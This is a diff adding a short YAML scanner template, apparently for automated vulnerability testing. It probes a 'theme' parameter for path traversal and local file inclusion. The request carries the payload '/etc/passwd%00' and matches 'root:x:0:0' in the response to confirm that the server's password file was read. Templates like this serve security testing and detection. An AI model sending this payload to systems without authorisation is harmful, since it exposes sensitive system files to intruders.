@@ -1,0 +1,20 @@
+id: lfi6-0684
+name: 'Traversal in theme'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via theme'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      theme:
+        - '/etc/passwd%00'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
